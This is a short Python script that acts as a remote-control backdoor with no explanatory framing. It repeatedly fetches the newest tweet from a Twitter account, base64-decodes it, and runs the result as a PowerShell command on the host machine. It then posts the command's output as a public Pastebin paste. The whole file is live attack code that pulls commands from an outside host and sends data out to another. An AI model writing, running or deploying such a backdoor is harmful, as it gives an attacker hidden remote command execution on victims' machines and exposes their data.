import requests, subprocess, time
from bs4 import BeautifulSoup
from pastebin import PastebinAPI

lastTweet = ''

while True:
    r       = requests.get('https://twitter.com/S1mpleCC')
    soup    = BeautifulSoup(r.text, 'lxml')
    tag     = soup.find("p", "tweet-text")
    tweet   = tag.text
    if tweet != lastTweet:
        payload = str(tweet).decode('base64')
        cmd       = subprocess.Popen(["powershell.exe", payload], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        cmdStdOut = cmd.stdout.read()
        cmdStdErr = cmd.stderr.read()
        res       = cmdStdOut + cmdStdErr
        lastTweet = tweet
        params = {
            'api_dev_key': '', # Votre clé !!!
            'api_option': 'paste',
            'api_paste_code': res,
            'api_paste_private': '0'
        }
        req = requests.post("https://pastebin.com/api/api_post.php", data=params)
        print req.text
    time.sleep(5)